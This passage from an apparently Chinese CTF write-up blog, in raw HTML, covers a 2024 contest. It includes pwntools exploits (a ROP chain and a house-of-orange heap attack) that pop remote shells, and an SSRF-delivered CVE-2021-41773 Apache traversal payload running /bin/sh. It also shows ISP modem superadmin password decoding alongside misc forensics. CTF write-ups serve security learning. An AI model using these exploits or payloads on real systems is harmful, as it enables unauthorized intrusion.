class="number">0xB5</span>, <span class="number">0xE2</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3D</span>, <span class="number">0x07</span>, <span class="number">0x4A</span>, <span class="number">0xE8</span>, <span class="number">0x96</span>, <span class="number">0xA2</span>, <span class="number">0x9D</span>, <span class="number">0x4D</span>, <span class="number">0xBC</span>, <span class="number">0x81</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x78</span>&#125;;</span><br><span class="line">    <span class="type">char</span> inputData[] = <span class="string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        indexArray[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">37</span>; k &gt; <span class="number">0</span>; --k) &#123;</span><br><span class="line">        <span class="type">int</span> swapIndex = permutationOrder[<span class="number">37</span> - k] % (k + <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> tempIndex = indexArray[k];</span><br><span class="line">        indexArray[k] = indexArray[swapIndex];</span><br><span class="line">        indexArray[swapIndex] = tempIndex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];</span><br><span class="line">        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, outputBuffer[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>IDA8.3补全符号表，开了个NX，不影响打栈溢出 </p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;8.147.133.63&quot;</span>, <span class="number">17147</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x404043</span></span><br><span class="line">rax_ret = <span class="number">0x40f984</span></span><br><span class="line">rdi_ret = <span class="number">0x4a18a5</span></span><br><span class="line">rsi_ret = <span class="number">0x42138a</span></span><br><span class="line">rdx_ret = <span class="number">0x4944ec</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(elf.bss()) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">0x18</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(rsi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(rdx_ret) + p64(<span class="number">0x100</span>) + p64(rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(rdx_ret) + p64(<span class="number">0</span>) + p64(rax_ret) + p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="orange-cat-diar"><a href="#orange-cat-diar" class="headerlink" title="orange_cat_diar"></a>orange_cat_diar</h2><p>有个UAF</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607114611892-716076837.png" alt="image-20240607114610173"></p><p>然后就是house of orange，打unsorted bin attack泄露libc基址，然后改malloc_hook</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./orange_cat_diary&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.128.251&#x27;</span>, <span class="number">17907</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>, <span class="string">&#x27;rweb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">1640</span> - <span class="number">0x10</span></span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x13</span>) + p64(libc_addr + one[<span class="number">2</span>]))</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校网络安全管理运维赛2024</title>
      <link href="/posts/17915e48.html"/>
      <url>/posts/17915e48.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>GIF 拆分 字符拼接</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;guvf-vf-gur-fvtava-dhvm&#125;</span><br><span class="line"></span><br><span class="line">ROT13:</span><br><span class="line">flag&#123;this-is-the-signin-quiz&#125;</span><br></pre></td></tr></table></figure><h2 id="钓鱼邮件识别"><a href="#钓鱼邮件识别" class="headerlink" title="钓鱼邮件识别"></a>钓鱼邮件识别</h2><p>打开eml<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png#averageHue=%23f0eeed&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=581&amp;id=udff21a67&amp;originHeight=872&amp;originWidth=1680&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=95596&amp;status=done&amp;style=none&amp;taskId=u05ad4560-fb10-4616-898b-cda133bda73&amp;title=&amp;width=1120" alt="image.png"><br>base64解码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png#averageHue=%23f0eeee&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=796&amp;id=u40cbeb7d&amp;originHeight=1194&amp;originWidth=1217&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=299105&amp;status=done&amp;style=none&amp;taskId=u452493a0-5876-4ab4-a782-0e3fd32b6b6&amp;title=&amp;width=811.3333333333334" alt="image.png"></p><h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png#averageHue=%23f2f0f0&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=154&amp;id=u298f23e6&amp;originHeight=231&amp;originWidth=1207&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=57021&amp;status=done&amp;style=none&amp;taskId=u629f2172-4f06-471e-ae52-b029e298d61&amp;title=&amp;width=804.6666666666666" alt="image.png"></p><h3 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png#averageHue=%23e5e5e1&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=56&amp;id=uc548bc24&amp;originHeight=84&amp;originWidth=283&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=10693&amp;status=done&amp;style=none&amp;taskId=u21d028cf-74ce-4e2b-8c6e-c25ddd55428&amp;title=&amp;width=188.66666666666666" alt="image.png"></p><h3 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h3><p>第三段解析DNS的记录<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=736&amp;id=u91730a03&amp;originHeight=1104&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=117830&amp;status=done&amp;style=none&amp;taskId=u76ac0f79-b444-4261-96e7-e57dbf97cb5&amp;title=&amp;width=1006" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=819&amp;id=u0f3a6024&amp;originHeight=1228&amp;originWidth=1787&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=156994&amp;status=done&amp;style=none&amp;taskId=ua783e53a-f8ac-4e0c-8f39-bbce8619212&amp;title=&amp;width=1191.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png#averageHue=%23f4f4f4&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=743&amp;id=ud216f656&amp;originHeight=1114&amp;originWidth=1757&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=122717&amp;status=done&amp;style=none&amp;taskId=ua65b1fa8-c3b3-4e1d-8277-02485e45c02&amp;title=&amp;width=1171.3333333333333" alt="image.png"></p><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>追踪流到倒数几个服务器流量解密发现如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png#averageHue=%23f1eee3&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=685&amp;id=uae05dd4f&amp;originHeight=1028&amp;originWidth=2273&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=365427&amp;status=done&amp;style=none&amp;taskId=u9d4285e5-ac30-459f-9259-d4cf393aa7c&amp;title=&amp;width=1515.3333333333333" alt="image.png"><br>pk头，是zip，保存成zip文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png#averageHue=%23e6e5e4&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=533&amp;id=u89338278&amp;originHeight=799&amp;originWidth=2301&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=287706&amp;status=done&amp;style=none&amp;taskId=ucc729f83-9ae1-45ca-95c0-a6d56ce6d5f&amp;title=&amp;width=1534" alt="image.png"><br>还发现了secret2.txt的内容<br>用上述txt，明文攻击zip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png#averageHue=%23161616&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;height=177&amp;id=ua192efbe&amp;originHeight=276&amp;originWidth=1306&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=35216&amp;status=done&amp;style=none&amp;taskId=u21076285-af22-44b2-a780-639183be2db&amp;title=&amp;width=835.84" alt="image.png"><br>用明文攻击获取到的key直接解secret1.txt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png#averageHue=%23e9e8e7&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=371&amp;id=uabab6e87&amp;originHeight=557&amp;originWidth=571&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=114715&amp;status=done&amp;style=none&amp;taskId=u3e46b3da-e009-42ed-9215-d3124941c50&amp;title=&amp;width=380.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png#averageHue=%23d1a970&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=231&amp;id=udaace66e&amp;originHeight=347&amp;originWidth=1335&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=68080&amp;status=done&amp;style=none&amp;taskId=u6f8be26f-5e1e-4c2f-b7c1-23145c69071&amp;title=&amp;width=890" alt="image.png"></p><h2 id="SecretDB"><a href="#SecretDB" class="headerlink" title="SecretDB"></a>SecretDB</h2><p>用DB Browser for SQLite查看数据库，但是说flag不在这里<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png#averageHue=%23f7f7f6&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=313&amp;id=u586e86e7&amp;originHeight=391&amp;originWidth=1266&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=30839&amp;status=done&amp;style=none&amp;taskId=u4e4db746-4cc3-4594-93e8-d9d9b968c13&amp;title=&amp;width=1012.8" alt="image.png"><br>放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png#averageHue=%2386c292&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=406&amp;id=tOoxc&amp;originHeight=508&amp;originWidth=659&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=55792&amp;status=done&amp;style=none&amp;taskId=u489604f7-52c6-4411-ad0d-04475762b90&amp;title=&amp;width=527.2" alt="image.png"><br>然后写脚本进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"></span><br><span class="line">flag = &#123;&#125;</span><br><span class="line">parts = c.split(<span class="string">b&#x27;\x01\x0f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> parts[<span class="number">1</span>:-<span class="number">2</span>]:  <span class="comment"># 修正切片范围</span></span><br><span class="line">    flag[i[<span class="number">0</span>]] = <span class="built_in">chr</span>(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接按照排序后的键值对打印结果</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(flag.keys()):</span><br><span class="line">    <span class="built_in">print</span>(flag[k], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用下面的一行代码来替代上面的 for 循环</span></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join([flag[k] for k in sorted(flag.keys())]))</span></span><br></pre></td></tr></table></figure><h2 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h2><p>在附件中找到了密码，但还是编码的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png#averageHue=%23fcfaf9&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=546&amp;id=pD8i3&amp;originHeight=682&amp;originWidth=1429&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=106870&amp;status=done&amp;style=none&amp;taskId=u5b2fa89a-8cf7-4209-b10f-a85f6b49e4c&amp;title=&amp;width=1143.2" alt="image.png"><br>在题目附件里发现这个，联想到电信光猫的超密解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png#averageHue=%23e4f2f0&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=84&amp;id=u807f3ad5&amp;originHeight=105&amp;originWidth=534&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=46720&amp;status=done&amp;style=none&amp;taskId=uee655861-9d30-49c5-988f-6d76061f717&amp;title=&amp;width=427.2" alt="image.png"><br>参考内容<br><a href="https://cloud.tencent.com/developer/article/2006614">破解光猫超级管理员密码，也就是获取telecomadmin的密码</a><br>把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = <span class="selector-attr">[106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]</span></span><br><span class="line"></span><br><span class="line">decode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> <span class="comment">// 100 != 0:</span></span><br><span class="line">        decode += <span class="built_in">chr</span>(<span class="selector-tag">i</span> - <span class="number">4</span>)    #三位数的按字母处理</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decode += <span class="built_in">chr</span>(i)        #两位数的按数字处理</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(decode)</span></span></span><br></pre></td></tr></table></figure><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><ul><li>源码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,send_file</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;webserver&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dstport=<span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">        data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        recvdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">2048</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                recvdata += chunk</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> recvdata</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>CVE-2021-41773<br><a href="https://blog.csdn.net/luochen2436/article/details/120698682">https://blog.csdn.net/luochen2436/article/details/120698682</a><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">port</span>=<span class="number">80</span>&amp;data=POST%<span class="number">20</span>%<span class="number">2</span>fcgi-bin%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>fbin%<span class="number">2</span>fsh%<span class="number">20</span>HTTP%<span class="number">2</span>f1.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost%<span class="number">3</span>a%<span class="number">20127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept%<span class="number">3</span>a%<span class="number">20</span>*%<span class="number">2</span>f*%<span class="number">0</span>d%<span class="number">0</span>aAccept-Language%<span class="number">3</span>a%<span class="number">20</span>zh-CN%<span class="number">2</span>czh%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">8</span>%<span class="number">2</span>czh-TW%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">7</span>%<span class="number">2</span>czh-HK%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">5</span>%<span class="number">2</span>cen-US%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">3</span>%<span class="number">2</span>cen%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">2</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept-Encoding%<span class="number">3</span>a%<span class="number">20</span>gzip%<span class="number">2</span>c%<span class="number">20</span>deflate%<span class="number">0</span>d%<span class="number">0</span>aContent-Type%<span class="number">3</span>a%<span class="number">20</span>application%<span class="number">2</span>fx-www-form-urlencoded%<span class="number">0</span>d%<span class="number">0</span>aCache%<span class="number">3</span>a%<span class="number">20</span>no-cache%<span class="number">0</span>d%<span class="number">0</span>aContent-Length%<span class="number">3</span>a%<span class="number">2012</span>%<span class="number">0</span>d%<span class="number">0</span>aConnection%<span class="number">3</span>a%<span class="number">20</span>close%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aecho%<span class="number">3</span>bcat%<span class="number">20</span>%<span class="number">2</span>ff*%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h2 id="f-or-r"><a href="#f-or-r" class="headerlink" title="f or r"></a>f or r</h2><p>一层一层解压.cab文件，找到Cab for KB114514 PSFX，发现跟前两天的GeekCTF的题有点像<br><img 